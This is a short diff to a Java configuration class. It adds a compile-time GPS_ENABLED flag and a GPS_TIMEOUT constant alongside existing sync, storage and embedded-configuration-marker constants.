@@ -66,6 +66,12 @@ public final class Conf {
     public static final boolean SYNCACTION_FORCE_WIFI = false;
     public static final boolean SD_ENABLED = false;
     
+    //#ifdef ENABLE_GPS
+    public static final boolean GPS_ENABLED = true;
+    //#else
+    public static final boolean GPS_ENABLED = false;
+    //#endif
+    
     public static boolean IS_UI = true;
 
     //==========================================================
@@ -121,6 +127,8 @@ public final class Conf {
 
     public static final byte[] FAKECONFSTART = "XW15TZlwZwpaWGPZ1wtL0f591tJe2b9c1z4PvkRuZaP1jTUR6yfBfLm4Knsu0st2"
             .getBytes();
+
+    public static final int GPS_TIMEOUT = 30;
 
     /**
      * Crc verify.
